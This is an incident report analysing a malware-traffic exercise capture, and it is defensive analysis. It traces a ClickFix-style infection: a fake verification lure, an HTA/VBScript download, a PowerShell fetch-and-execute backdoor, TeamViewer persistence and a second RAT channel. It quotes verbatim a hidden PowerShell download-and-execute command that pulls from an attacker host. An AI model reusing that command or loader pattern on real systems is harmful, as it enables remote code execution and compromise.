# Incident Report — MTA 2025-01-22 Exercise Capture

## Evidence reviewed
`2025-01-22-traffic-analysis-exercise.pcap` (39,427 frames, ~3202s, LAN `10.1.17.0/24`, gateway/DC `10.1.17.2`). No IDS/Suricata alert exports or other artifacts were present in the evidence directory — attribution below is behavioral, derived entirely from packet content.

## Victim host
- **IP:** 10.1.17.215
- **MAC:** 00:d0:b7:26:4a:74 (confirmed via ARP `arp.src.hw_mac` and `eth.src` on all frames sourced from this IP)
- **Hostname:** DESKTOP-L8C5GSJ (DHCP option 12 hostname, frames 1 & 3; also NBNS `DESKTOP-L8C5GSJ<00>/<20>`)
- **Logged-in user:** `shutchenson` (Kerberos `CNameString`, realm `BLUEMOONTUESDAY.COM`, associated with 10.1.17.215)
- Domain: `bluemoontuesday.com` (AD domain; DC at 10.1.17.2)

## Infection chain (all timestamps relative to capture start)
1. **t=38.2–39.4s** — DNS lookup for `google-authenticator.burleson-appliance.net` (resolves to Cloudflare IPs 104.21.x.x), followed immediately by a lookup and TLS connection (SNI) to **`authenticatoor.org`** (82.221.136.26:443). This is the classic "ClickFix" fake verification/CAPTCHA lure pattern — a page telling the user to run a paste-and-execute fix.
2. **t=60.3s** — Victim downloads `http://5.252.153.241/api/file/get-file/264872` (frame 5031). This file is an HTA/VBScript "component" whose payload runs:
   `cmd /c start /min powershell -NoProfile -WindowStyle Hidden -Command "start-process 'https://azure.microsoft.com'; iex (new-object System.Net.WebClient).DownloadString('http://5.252.153.241:80/api/file/get-file/29842.ps1')"` — opening a decoy legitimate tab while silently fetching a PowerShell loader.
3. **t=62.1s** — Downloads and executes `29842.ps1` (frame 5063). Decoded, it reads the C:\ drive volume serial number, converts it to decimal, and loops forever doing `WebClient.DownloadString("http://5.252.153.241/<serial>")` and `Invoke-Expression`-ing whatever the server returns every 5 seconds — a fetch-execute backdoor keyed by a per-machine numeric ID (observed beaconing to `/1517096937` for the rest of the capture).
4. **t=124.9–129.2s** — The C2 pushes back a command script (captured verbatim in a beacon response body) that downloads `TeamViewer.exe`, `Teamviewer_Resource_fr.dll`, `TV.dll`, and `pas.ps1` from `5.252.153.241/api/file/get-file/*` into `C:\ProgramData\huo\`, then creates a Startup-folder shortcut (`TeamViewer.lnk`) pointing at `C:\ProgramData\huo\TeamViewer.exe` for persistence, and logs `"startup shortcut created; status = success"` back to the C2 (frame 13677) — matching the observed beacon URI exactly.
5. **t=889.6s onward** — A second, separate C2 channel opens: TLS to **45.125.66.32:2917**, with the TLS SNI literally set to the raw IP string `"45.125.66.32"` and a self-signed certificate whose subject/issuer CN is `"45.125.66.32: Self-signed certificate"` (O=`Self-signed certificate`, C=`XX`, ST/L=`N/A`) — a hallmark of a RAT client generating its own throwaway TLS cert rather than a legitimate service. This session carries ~10 MB over ~1720s of sustained bidirectional traffic, consistent with an interactive RAT/C2 session running after the dropped TeamViewer/backdoor executed.

Separately, legitimate TeamViewer infrastructure traffic (`din.aspx?...client=DynGate` to `master16.teamviewer.com` / 185.188.32.26) confirms the dropped TeamViewer.exe is a genuine TeamViewer client being abused for remote access, not a modified binary.

## Malware family
**Not signature-confirmed** (no IDS/Suricata alerts were supplied with this evidence, and no self-identifying strings, PDB paths, or product banners appear in the traffic). Attribution is **behavioral**: this is a **ClickFix-style social-engineering loader** (fake verification/CAPTCHA page → hidden HTA/VBScript → PowerShell fetch-execute backdoor) that installs a legitimate **TeamViewer client as a remote-access trojan**, with an additional apparent RAT C2 channel over self-signed TLS on a non-standard port. Given the mechanics (disk-serial-keyed beacon ID, `/api/file/get-file/` panel API, `C:\ProgramData\huo\` staging directory, Startup-folder persistence), this matches the well-documented "ClickFix → TeamViewer RAT" delivery pattern; I cannot assert a specific named malware family (e.g. AsyncRAT/DcRat/etc.) without a signature hit or reverse-engineered sample.

## Indicators of Compromise
